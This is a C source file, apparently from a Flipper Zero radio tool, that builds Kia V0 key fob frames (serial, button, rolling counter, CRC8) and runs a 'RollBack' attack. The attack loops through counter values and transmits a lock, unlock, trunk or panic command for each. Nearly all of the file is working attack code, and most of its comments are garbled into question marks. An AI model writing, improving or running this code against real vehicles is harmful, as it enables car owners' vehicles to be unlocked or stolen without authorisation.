#include "protopirate_rb.h"

// ===================== RollBack ???? =====================

/**
 * rollback_build_frame - ????????Kia V0???
 * 
 * Kia V0??? (56??? + ??):
 *   dataLo[55:0] = serial[27:0] | button[3:0] | counter[15:0] | crc[7:0]
 * 
 * @param serial  ?????? (28-bit)
 * @param button  ??? (4-bit: 1=Lock, 2=Unlock, 3=Trunk, 4=Panic)
 * @param counter ???? (16-bit, ????)
 * @param data_hi ??????
 * @param data_lo ??????
 */
void rollback_build_frame(uint32_t serial, uint8_t button, uint16_t counter,
                          uint32_t* data_hi, uint32_t* data_lo) {
    // ???
    uint32_t frame_serial = (serial & 0x0FFFFFFF) << 12;
    uint16_t frame_btn = (button & 0x0F) << 8;
    uint16_t frame_cnt = counter;

    // ???CRC????
    uint32_t prelim_lo = frame_serial | frame_btn | frame_cnt;

    // CRC??
    uint8_t crc_bytes[6] = {0};
    crc_bytes[3] = (prelim_lo >> 24) & 0xFF;
    crc_bytes[4] = (prelim_lo >> 16) & 0xFF;
    crc_bytes[5] = (prelim_lo >> 8) & 0xFF;
    uint8_t crc = kia_crc8(crc_bytes, 6);

    // ???
    *data_hi = 0;
    *data_lo = frame_serial | frame_btn | frame_cnt | crc;

    FURI_LOG_I(TAG, "RollBack frame: serial=0x%07lX btn=0x%X cnt=0x%04X crc=0x%02X",
               serial, button, counter, crc);
}

/**
 * rollback_send_single - ????????
 * ???????????
 */
bool rollback_send_single(ProtoPirateApp* app, uint32_t serial, uint8_t button, uint16_t counter) {
    uint32_t data_hi, data_lo;
    rollback_build_frame(serial, button, counter, &data_hi, &data_lo);

    // ????TX????
    return transmit_packet(app, data_hi, data_lo, app->frequency, app->rollback.burst_count);
}

/**
 * rollback_attack_run - ????????????
 * 
 * ??:
 * 1. ?baseCounter??
 * 2. ?step_size????????
 * 3. ??????????
 * 4. ??????targetCounter?????
 * 
 * ????????????:
 * - ??????????????????
 * - ??????????????,??????
 * - ???????????????
 */
bool rollback_attack_run(ProtoPirateApp* app) {
    RollbackState* rs = &app->rollback;
    rs->running = true;

    uint16_t start = rs->base_counter;
    uint16_t end = rs->target_counter;
    uint16_t step = rs->step_size;
    if(step == 0) step = 1;

    int16_t direction = (end > start) ? 1 : -1;
    uint32_t total_steps = abs((int32_t)end - (int32_t)start) / step + 1;
    uint32_t current_step = 0;

    FURI_LOG_I(TAG, "RollBack START: cnt 0x%04X -> 0x%04X, step=%u, total=%lu",
               start, end, step, total_steps);

    // ???TX
    transmit_start(app, app->frequency);

    for(uint16_t cnt = start;; cnt += direction * step) {
        // ??ESC??
        // (?????????)

        // ???
        uint32_t data_hi, data_lo;
        rollback_build_frame(rs->serial, rs->button, cnt, &data_hi, &data_lo);

        // ??
        transmit_burst(app, data_hi, data_lo);
        furi_delay_ms(30);

        rs->current_counter = cnt;
        current_step++;

        // ????
        if((direction > 0 && cnt >= end) ||
           (direction < 0 && cnt <= end)) {
            break;
        }

        // ????
        if(current_step > 65536) break;
    }

    transmit_stop(app);
    rs->running = false;

    FURI_LOG_I(TAG, "RollBack DONE: %lu frames sent", current_step);
    return true;
}
